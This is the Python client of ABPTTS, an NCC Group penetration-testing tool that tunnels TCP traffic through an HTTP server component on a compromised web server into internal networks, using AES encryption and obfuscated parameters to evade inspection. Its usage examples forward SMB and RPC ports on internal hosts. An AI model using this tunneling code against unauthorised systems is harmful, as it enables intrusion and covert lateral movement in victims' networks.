#!/usr/bin/env python

#	This file is part of A Black Path Toward The Sun ("ABPTTS")

# Copyright 2016 NCC Group

# A Black Path Toward The Sun ("ABPTTS") is free software: you can redistribute it and/or modify
# it under the terms of version 2 of the GNU General Public License as published by
# the Free Software Foundation.

# A Black Path Toward The Sun ("ABPTTS") is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with A Black Path Toward The Sun ("ABPTTS") (in the file license.txt).
# If not, see <http://www.gnu.org/licenses/>.

# Client component of A Black Path Toward The Sun

from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter,  RawDescriptionHelpFormatter
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
import pathlib
import logging
import math
import os
import random
import re
import sys

import threading
import select
import socket

import requests
from requests.adapters import HTTPAdapter, Retry
import time

from libabptts import ABPTTSConfiguration, ABPTTSVersion

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='[%(asctime)s][%(levelname)s] %(message)s')

abptts_config = ABPTTSConfiguration() #TODO CHANGE LOCATION

class StartClient(threading.Thread):
	def __init__(self, socket, addr, listener_config, abptts_config, unsafe_tls):
		super().__init__()
		self.socket = socket
		self.addr = addr
		self.listener_config = listener_config
		self.abptts_config = abptts_config
		self.encryption_key = None
		self.connection_id = None
		self.running = True
		self.traffic_sent = False
		self.is_listener_stopped = False
		self.c2s_buffer = b""
		self.iterations_counter = 0
		self.bytes_read = 0
		self.bytes_sent = 0
		self.socket_timeout_current = self.abptts_config.get_float("Network.client", "clientSocketTimeoutBase")
		self.client_block_size_limit_from_server = self.abptts_config.get_int("Network.client", "clientBlockSizeLimitFromServer")
		self.header_value_key = self.abptts_config.get_string("Authentication", "headerValueKey")
		self.access_key_mode =  self.abptts_config.get_string("Encryption", "accessKeyMode")
		self.param_name_access_key = self.abptts_config.get_string("Obfuscation", "paramNameAccessKey")
		self.param_name_encrypted_block = self.abptts_config.get_string("Obfuscation", "paramNameEncryptedBlock")
		self.param_name_plaintext_block = self.abptts_config.get_string("Obfuscation", "paramNamePlaintextBlock")
		self.echo_HTTP_body = self.abptts_config.get_boolean("Logging", "echoHTTPBody")
		self.echo_data = self.abptts_config.get_boolean("Logging", "echoData")
		self.echo_debug_messages = self.abptts_config.get_boolean("Logging", "echoDebugMessages")
		self.session = self.init_session(unsafe_tls)

	def init_session(self, unsafe_tls):
		s = requests.Session()
		retries = Retry(total=6, backoff_factor=1.0)

		s.headers.update({
			"User-Agent": self.abptts_config.get_string("Encryption", "headerValueUserAgent"),
			"Content-type": "application/x-www-form-urlencoded"
		})
		s.timeout = 10.0

		if unsafe_tls:
			requests.packages.urllib3.disable_warnings()
			s.verify = False

		s.mount('http://', HTTPAdapter(max_retries=retries))
		s.mount('https://', HTTPAdapter(max_retries=retries))

		return s

	def encrypt(self, plaintext):
		iv = bytearray(os.urandom(AES.block_size))
		reIV = bytearray(os.urandom(AES.block_size))
		rivPlaintext = pad(reIV + bytearray(plaintext.encode()), AES.block_size)
		cipher = AES.new(self.encryption_key, AES.MODE_CBC, IV=iv)
		return iv + cipher.encrypt(rivPlaintext)

	def decrypt(self, ciphertext):
		iv = ciphertext[0:AES.block_size]
		rivCiphertext = ciphertext[AES.block_size:]
		cipher = AES.new(self.encryption_key, AES.MODE_CBC, IV=iv)
		rivPlaintext = cipher.decrypt(rivCiphertext)
		rivPlaintext = unpad(rivPlaintext, AES.block_size)
		return rivPlaintext[AES.block_size:]

	def get_clean_server_response(self, response):
		result = response
		wrapper_text = []
		wrapper_prefix = b64decode(self.abptts_config.get_string("Obfuscation", "responseStringPrefixB64")).decode()
		wrapper_suffix = b64decode(self.abptts_config.get_string("Obfuscation", "responseStringSuffixB64")).decode()

		for s in [wrapper_prefix, wrapper_suffix]:
			# Handle not only the "normal" prefix/suffix blocks, but also any variations created by "helpful" servers, e.g. Apache Tomcat, which transparently strips \r characters from output
			result = result.replace(s.replace("\r", ""), "")
			result = result.replace(s, "")

		result = result.strip()

		if self.echo_HTTP_body:
			self.output_tunnel_IO_message("S2C", response, "HTTP Response Body")
			self.output_tunnel_IO_message("S2C", result, "HTTP Response Body Without Wrapper Text")

		return result

	def output_tunnel_IO_message(self, direction, message, category=""):
		server_address = f"{self.listener_config["remote"]["host"]}:{self.listener_config["remote"]["port"]}"
		client_address = f"{self.addr[0]}:{self.addr[1]}"
		listening_address = f"{self.listener_config["remote"]["host"]}:{self.listener_config["remote"]["port"]}"
		result = f"[({direction}) "

		if direction == "S2C":
			result += f"{server_address} -> {listening_address} -> {client_address}"
		else:
			result += f"{client_address} -> {listening_address} -> {server_address}"

		if self.connection_id:
			result += f" (Connection ID: {self.connection_id})"

		if category:
			result += f" ({category})"

		result += f"]: {message}"

		logger.info(result)

	def set_encryption(self):
		if self.abptts_config.get_string("Encryption", "encryptionKeyHex"):
			try:
				self.encryption_key = bytes.fromhex(self.abptts_config.get_string("Encryption", "encryptionKeyHex"))
				if self.encryption_key and self.abptts_config.get_string("Encryption", "accessKeyMode") == "header":
					self.session.headers.update({ self.abptts_config.get_string("Authentication", "headerNameKey"): self.header_value_key })
			except Exception as e:
				logger.exception("Could not cast encryption key to array of bytes")
				sys.exit(1)
		else:
			logger.warning("The current configuration DOES NOT ENCRYPT tunneled traffic. If you wish to use symmetric encryption, restart this utility with a configuration file which defines a valid encryption key.")

	def create_message(self, operation, params):
		plaintext_message = ""
		separators = [
			b64decode(self.abptts_config.get_string("Obfuscation", "dataBlockNameValueSeparatorB64")).decode(),
			b64decode(self.abptts_config.get_string("Obfuscation", "dataBlockParamSeparatorB64")).decode()
		]

		plaintext_message += self.abptts_config.get_string("Obfuscation", "paramNameOperation") + separators[0]
		plaintext_message += operation + separators[1]
		for param, sep_idx in params[:-1]:
			plaintext_message += param + separators[sep_idx]
		plaintext_message += params[-1]

		return plaintext_message

	def create_open_connection_message(self):
		operation = self.abptts_config.get_string("Obfuscation", "opModeStringOpenConnection")
		params = [
			(self.abptts_config.get_string("Obfuscation", "paramNameDestinationHost"), 0),
			(self.listener_config["remote"]["host"], 1),
			(self.abptts_config.get_string("Obfuscation", "paramNameDestinationPort"), 0),
			str(self.listener_config["remote"]["port"])
		]
		return self.create_message(operation, params)

	def create_close_connection_message(self):
		operation = self.abptts_config.get_string("Obfuscation", "opModeStringCloseConnection")
		params = [
			(self.abptts_config.get_string("Obfuscation", "paramNameConnectionID"), 0),
			self.connection_id
		]
		return self.create_message(operation, params)

	def create_send_receive_message(self, data):
		operation = self.abptts_config.get_string("Obfuscation", "opModeStringSendReceive")
		params = [
			(self.abptts_config.get_string("Obfuscation", "paramNameConnectionID"), 0),
			(self.connection_id, 1),
			(self.abptts_config.get_string("Obfuscation", "paramNameData"), 0),
			data
		]
		return self.create_message(operation, params)

	def read_socket(self):
		c2s_bytes_count = self.abptts_config.get_int("Network.client", "clientToServerBlockSize")
		c2s_buffer_length = len(self.c2s_buffer)
		c2s_bytes = b""

		if c2s_bytes_count > c2s_buffer_length:
			c2s_bytes_count = c2s_buffer_length

		if c2s_bytes_count < c2s_buffer_length:
			c2s_bytes = self.c2s_buffer[0:c2s_bytes_count]
			self.c2s_buffer = self.c2s_buffer[c2s_bytes_count:]
		else:
			c2s_bytes = self.c2s_buffer[:]
			self.c2s_buffer = b""

		c2s_b64encoded_data = b64encode(c2s_bytes).decode()

		if self.echo_debug_messages:
			self.output_tunnel_IO_message("C2S", f"Sending {len(c2s_bytes)} bytes")
		if self.echo_data:
			self.output_tunnel_IO_message("C2S", c2s_b64encoded_data, "Raw Data (Plaintext) (base64)")

		self.bytes_read += len(c2s_bytes)
		return c2s_b64encoded_data

	def send_message(self, message):
		response = ""
		clean_response = ""
		success = False

		if self.encryption_key:
			encrypted_message = b64encode(self.encrypt(message)).decode()
			if self.abptts_config.get_boolean("Logging", "echoData"):
				self.output_tunnel_IO_message("C2S", encrypted_message, "Raw Data (Encrypted) (base64)")
			body = { self.param_name_encrypted_block: encrypted_message }
			if self.access_key_mode != "header":
				body[self.param_name_access_key] = self.header_value_key
		else:
			message = b64encode(message).decode()
			body = { self.param_name_plaintext_block: message }
			if self.access_key_mode != "header":
				body[self.param_name_access_key] = self.header_value_key

		if self.echo_HTTP_body:
			self.output_tunnel_IO_message("C2S", body, "HTTP Request Body")

		try:
			response = self.session.post(self.listener_config["forwarding_url"], data=body)
			response = response.text
			clean_response = self.get_clean_server_response(response)
			success = True
		except Exception as e:
			logger.exception("C2S", f"HTTP request failed with the following message -> {e}")

		return clean_response, response, success

	def send_data_to_socket(self, body_array):
		bytes_sent = 0

		if body_array[0] == self.abptts_config.get_string("Obfuscation", "responseStringData"):
			s2c_encoded_bytes = body_array[1]
			s2c_bytes = b64decode(s2c_encoded_bytes)

			if self.echo_data:
				data_format = "Encrypted" if self.encryption_key else "Plaintext"
				self.output_tunnel_IO_message("S2C", s2c_encoded_bytes, f"Raw Data ({data_format}) (base64)")

			if self.encryption_key:
				s2c_bytes = self.decrypt(s2c_bytes)

			s2c_bytes_len = len(s2c_bytes)
			number_of_blocks = int(math.ceil(float(s2c_bytes_len) / float(self.client_block_size_limit_from_server)))

			if self.echo_debug_messages and number_of_blocks > 1:
				self.output_tunnel_IO_message("S2C", f"Splitting large block ({s2c_bytes_len} bytes) into {number_of_blocks} blocks for relay to client")

			for block_index in range(number_of_blocks):
				first_byte = block_index * self.client_block_size_limit_from_server
				last_byte = (block_index + 1) * self.client_block_size_limit_from_server

				if last_byte > s2c_bytes_len:
					last_byte = s2c_bytes_len

				current_block = s2c_bytes[first_byte:last_byte]
				bytes_sent += len(current_block)

				if self.echo_data:
					self.output_tunnel_IO_message("S2C", b64encode(current_block).decode(), "Raw Data (Plaintext) (base64)")

				if self.echo_debug_messages:
					self.output_tunnel_IO_message("S2C", f"(Block {block_index + 1}/{number_of_blocks}) {len(current_block)} bytes")

				try:
					self.socket.send(current_block)
				except Exception as e:
					logger.exception(f"Error sending data to client - {e}")

				delay = self.abptts_config.get_float("Network.client", "clientBlockTransmitSleepTime")
				if delay > 0.0:
					if block_index < (number_of_blocks - 1):
						time.sleep(delay)

		return bytes_sent

	def update_iterations(self):
		self.iterations_counter += 1

		if self.iterations_counter > self.abptts_config.get_int("Logging", "statsUpdateIterations"):
			self.output_tunnel_IO_message("C2S", f"{self.bytes_read} bytes sent since last report")
			self.output_tunnel_IO_message("S2C", f"{self.bytes_sent} bytes sent since last report")
			self.iterations_counter = 0
			self.bytes_read = 0
			self.bytes_sent = 0

	def parse_server_error(self, body):
		found_response_type = False

		if body == self.abptts_config.get_string("Obfuscation", "responseStringNoData"):
			found_response_type = True
			if self.echo_debug_messages:
				self.output_tunnel_IO_message("S2C", "No data to receive from server at this time")
		else:
			self.traffic_sent = True

		if body == self.abptts_config.get_string("Obfuscation", "responseStringErrorInvalidRequest"):
			self.output_tunnel_IO_message("S2C", "The server reported that the request was invalid. Verify that that you are using a client configuration compatible with the server-side component.")
		elif body == self.abptts_config.get_string("Obfuscation", "responseStringErrorConnectionOpenFailed"):
			self.output_tunnel_IO_message("S2C", "The server reported that the requested connection could not be opened. You may have requested a destination host/port that is inaccessible to the server, the server may have exhausted ephemeral ports (although this is unlikely), or another component (e.g. firewall) may be interfering with connectivity.")
		elif body == self.abptts_config.get_string("Obfuscation", "responseStringErrorConnectionSendFailed"):
			self.output_tunnel_IO_message("S2C", "The server reported that an error occurred while sending data over the TCP connection.")
		elif body == self.abptts_config.get_string("Obfuscation", "responseStringErrorConnectionReceiveFailed"):
			self.output_tunnel_IO_message("S2C", "The server reported that an error occurred while receiving data over the TCP connection.")
		elif body == self.abptts_config.get_string("Obfuscation", "responseStringErrorDecryptFailed"):
			self.output_tunnel_IO_message("S2C", "The server reported a decryption failure. Verify that the encryption keys in the client and server configurations match.")
		elif body == self.abptts_config.get_string("Obfuscation", "responseStringErrorEncryptFailed"):
			self.output_tunnel_IO_message("S2C", "The server reported an encryption failure. Verify that the encryption keys in the client and server configurations match.")
		elif body == self.abptts_config.get_string("Obfuscation", "responseStringErrorEncryptionNotSupported"):
			self.output_tunnel_IO_message("S2C", "The server reported that it does not support encryption. Verify that that you are using a client configuration compatible with the server-side component.")
		else:
			if not found_response_type:
				self.output_tunnel_IO_message("S2C", f"Unexpected response from server: {body}")
				self.client_closed_connection = True

	def update_socket_timeout(self, scale_socket_timeout_down, scale_socket_timeout_up):
		client_socket_timeout_min = self.abptts_config.get_float("Network.client", "clientSocketTimeoutMin")
		client_socket_timeout_max = self.abptts_config.get_float("Network.client", "clientSocketTimeoutMax")
		timeout_change = 0.0
		new_socket_timeout = self.socket_timeout_current

		if scale_socket_timeout_down:
			new_socket_timeout = client_socket_timeout_min
		if scale_socket_timeout_up:
			timeout_change = self.abptts_config.get_float("Network.client", "clientSocketTimeoutScalingMultiplier") * self.socket_timeout_current
			new_socket_timeout = self.socket_timeout_current + timeout_change

		# make sure socket timeout is within specified range
		if new_socket_timeout < client_socket_timeout_min:
			new_socket_timeout = client_socket_timeout_min
		if new_socket_timeout > client_socket_timeout_max:
			new_socket_timeout = client_socket_timeout_max

		if new_socket_timeout != self.socket_timeout_current:
			if self.echo_debug_messages:
				logger.info(f"[Connection ID {self.connection_id}]: Client-side socket timeout has been changed from {self.socket_timeout_current} to {new_socket_timeout}")
			self.socket_timeout_current = new_socket_timeout

		# apply random socket timeout variation
		client_socket_timeout_variation = self.abptts_config.get_float("Network.client", "clientSocketTimeoutVariation")
		client_socket_timeout_variation_neg = client_socket_timeout_variation * -1.0
		timeout_var = random.uniform(client_socket_timeout_variation_neg, client_socket_timeout_variation)
		timeout_modifier = self.socket_timeout_current * timeout_var
		effective_timeout = self.socket_timeout_current + timeout_modifier
		if self.echo_debug_messages:
			logger.info(f"[Connection ID {self.connection_id}]: Applying random variation of {timeout_modifier} to client-side socket timeout for this iteration - timeout will be {effective_timeout}")

		self.socket.settimeout(effective_timeout)

	def start_connection(self):
		clean_response, raw_response, success = self.send_message(self.create_open_connection_message())

		if success:
			if self.abptts_config.get_string("Obfuscation", "responseStringConnectionCreated") in clean_response:
				response_array = clean_response.split(" ")
				if len(response_array) > 1:
					self.connection_id = response_array[1]
					self.output_tunnel_IO_message("S2C", f"Server created connection ID {self.connection_id}")
			else:
				self.stop()
				logger.critical(f"Could not create connection. Raw server response: {raw_response}")

	def run(self):
		self.socket.settimeout(self.socket_timeout_current)
		self.set_encryption()
		logger.info(f"Connecting to {self.listener_config["remote"]["host"]}:{self.listener_config["remote"]["port"]} via {self.listener_config["forwarding_url"]}")
		self.start_connection()
		self.client_closed_connection = False

		while self.running:
			c2s_b64encoded_data = ""
			self.traffic_sent = False
			self.bytes_read = 0
			self.bytes_sent = 0
			self.iterations_counter = 0

			try:
				data = self.socket.recv(self.abptts_config.get_int("Network.client", "clientSocketBufferSize"))
				if data:
					self.c2s_buffer += data
				else:
					self.client_closed_connection = True
			except socket.error as e:
				if "timed out" not in str(e):
					logger.exception(f"Error reading socket: {e}")
					raise e

			if self.c2s_buffer:
				c2s_b64encoded_data = self.read_socket()
			else:
				if self.client_closed_connection:
					self.output_tunnel_IO_message("C2S", "Client closed channel")
					break

			clean_response, raw_response, success = self.send_message(self.create_send_receive_message(c2s_b64encoded_data))
			if success:
				self.traffic_sent = True
			else:
				break

			body_array = clean_response.split(" ", 1)
			if len(body_array) > 1:
				self.bytes_sent += self.send_data_to_socket(body_array)
			else:
				self.parse_server_error(clean_response)

			if self.abptts_config.get_string("Obfuscation", "responseStringConnectionClosed") in clean_response:
				self.output_tunnel_IO_message("S2C", f"The server explicitly closed connection ID {self.connection_id}")
				self.client_closed_connection = True

			if self.abptts_config.get_string("Obfuscation", "responseStringErrorConnectionNotFound") in clean_response:
				self.output_tunnel_IO_message("S2C", f"The server reported that connection ID {self.connection_id} was not found - assuming connection has been closed.")
				self.client_closed_connection = True

			scale_socket_timeout_down = True if self.traffic_sent else False
			scale_socket_timeout_up = False if self.traffic_sent else True

			if self.client_closed_connection:
				self.stop()
				body_array = clean_response.split(" ")
				if len(body_array) > 1:
					self.connection_id = body_array[1]
					self.output_tunnel_IO_message("S2C", f"The server closed connection ID {self.connection_id}")
				else:
					self.output_tunnel_IO_message("S2C", f"The server closed connection ID {self.connection_id} without specifying its ID")

			self.update_iterations()
			if self.is_listener_stopped:
				logger.info(f"Server shutdown request received in thread for connection ID {self.connection_id}")
				self.stop()
			else:
				if self.abptts_config.get_boolean("Network.client", "autoscaleClientSocketTimeout"):
					self.update_socket_timeout(scale_socket_timeout_down, scale_socket_timeout_up)

		if self.client_closed_connection:
			server_address = f"{self.listener_config["remote"]["host"]}:{self.listener_config["remote"]["port"]}"
			client_address = f"{self.addr[0]}:{self.addr[1]}"
			listening_address = f"{self.listener_config["remote"]["host"]}:{self.listener_config["remote"]["port"]}"

			logger.info(f"Disengaging tunnel ({client_address} -> {listening_address} -> {server_address})")
			logger.info(f"Closing client socket ({client_address} -> {listening_address})")

			try:
				self.socket.shutdown(1)
				self.socket.close()
			except Exception as e:
				logger.exception(f"Exception while closing client socket ({client_address} -> {listening_address}): {e}")

			clean_response, raw_response, success = self.send_message(self.create_close_connection_message())
			if success:
				if self.abptts_config.get_string("Obfuscation", "responseStringConnectionClosed") in clean_response:
					body_array = clean_response.split(" ")
					if len(body_array) > 1:
						self.connection_id = body_array[1]
						logger.info(f"Server closed connection ID {self.connection_id}")
				else:
					logger.warning(f"Could not close connection ID {self.connection_id} (may have already been closed on the server). Raw server response: {raw_response}")
		else:
			logger.info("Unexpected state: child loop exited without closeConnections being set to 1")

	def stop(self):
		self.running = False

	def stop_listener(self):
		self.is_listener_stopped = True

class StartListener(threading.Thread):
	def __init__(self, listener_config, abptts_config, unsafe_tls):
		super().__init__()
		self.forwarding_url = listener_config["forwarding_url"]
		self.local = listener_config["local"]
		self.remote = listener_config["remote"]
		self.abptts_config = abptts_config
		self.listener_config = listener_config
		self.unsafe_tls = unsafe_tls
		self.queue = []
		self.running = True

	def run(self):
		try:
			server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server.bind((self.local["host"], self.local["port"]))
			server.listen()
		except Exception as e:
			logger.exception(f"Could not start listener on {self.local["host"]}:{self.local["port"]}{os.linesep}{e}")

		logger.info(f"Listener ready to forward connections from {self.local["host"]}:{self.local["port"]} to {self.remote["host"]}:{self.remote["port"]} via {self.forwarding_url}")
		logger.info(f"Waiting for client connections on {self.local["host"]}:{self.local["port"]}")

		while self.running:
			try:
				timeout = 2
				readable, writable, errored = select.select([server], [], [], timeout)
				for s in readable:
					client, addr = s.accept()
					logger.info(f"Client connected to {self.local["host"]}:{self.local["port"]}")
					formattedAddress = f"{self.local["host"]}:{self.local["port"]}"
					client = StartClient(client, addr, self.listener_config, self.abptts_config, self.unsafe_tls)
					client.start()
					self.queue.append(client)
			except Exception as e:
				if "Closing connections" not in str(e):
					raise e

	def stop(self):
		for q in self.queue:
			q.stop()
		self.running = False

if __name__=='__main__':
	ABPTTSVersion.showBanner()

	basePath = pathlib.Path(__file__).parent.resolve()

	parser = ArgumentParser(prog='ABPTTS',
    	formatter_class=ArgumentDefaultsHelpFormatter,
		usage='Usage: %(prog)s -c CONFIG_FILE_1 -c CONFIG_FILE_2 [...] -c CONFIG_FILE_n -u FORWARDINGURL -f LOCALHOST1:LOCALPORT1/TARGETHOST1:TARGETPORT1 -f LOCALHOST2:LOCALPORT2/TARGETHOST2:TARGETPORT2 [...] -f LOCALHOSTn:LOCALPORTn/TARGETHOSTn:TARGETPORTn [--debug]',
		epilog='Example: %(prog)s -c CONFIG_FILE_1 -u https://vulnerableserver/EStatus/ -f 127.0.0.1:28443/10.10.20.11:8443 \
			Example: %(prog)s -c CONFIG_FILE_1 -c CONFIG_FILE_2 -u https://vulnerableserver/EStatus/ -f 127.0.0.1:135/10.10.20.37:135 -f 127.0.0.1:139/10.10.20.37:139 -f 127.0.0.1:445/10.10.20.37:445 \
			Data from configuration files is applied in sequential order, to allow partial customization files to be overlayed on top of more complete base files. \
			IE if the same parameter is defined twice in the same file, the later value takes precedence, and if it is defined in two files, the value in whichever file is specified last on the command line takes precedence.')
	parser.add_argument('-c', help='specifies configuration files', default=[os.path.join(basePath, "data", "settings-default.txt"), os.path.join(basePath, "data", "settings-fallback.txt")], action='append', dest='config_files')
	parser.add_argument('-u', help='specifies fowarding URL', dest='forwarding_url', required=True)
	parser.add_argument('-f', help='specifies fowarding configurations', default=[], action='append', dest='forwarding_configs', required=True)
	parser.add_argument('--log', help='specifies logfile name', dest='logfile')
	parser.add_argument('--unsafe-tls', help='will disable TLS/SSL certificate validation when connecting to the server, if the connection is over HTTPS', action='store_true')
	parser.add_argument('--debug', help='enables verbose output.', action='store_true')

	args = parser.parse_args()

	if args.unsafe_tls:
		logger.warning("The current configuration ignores TLS/SSL certificate validation errors for connection to the server component.\nThis increases the risk of the communication channel being intercepted or tampered with.")

	abptts_config.LoadParameters(args.config_files)

	if args.logfile:
		abptts_config.ReplaceValue("Logging", "writeToLog", "True")
		abptts_config.ReplaceValue("Logging", "logFilePath", args.logfile)

	if args.debug:
		abptts_config.ShowParameters()

	queue = []

	for forwarding_config in args.forwarding_configs:
		try:
			local, dst = forwarding_config.split("/")
			ip_local, port_local = local.split(":")
			ip_dst, port_dst = dst.split(":")
			port_local = int(port_local)
			port_dst = int(port_dst)
		except:
			logger.exception(f"Error while parsing the following forwarding config {forwarding_config}")
			sys.exit(1)

		listener_config = {
			"forwarding_url": args.forwarding_url,
			"local": { "host": ip_local, "port": port_local },
			"remote": { "host": ip_dst, "port": port_dst }
		}
		listener = StartListener(listener_config, abptts_config, args.unsafe_tls)
		listener.start()
		queue.append(listener)

	try:
		while True:
			time.sleep(1)
	except KeyboardInterrupt:
		logger.info('Terminating listeners')
		for q in queue:
			q.stop()
		runServer = 0

	logger.info('Server shutdown')
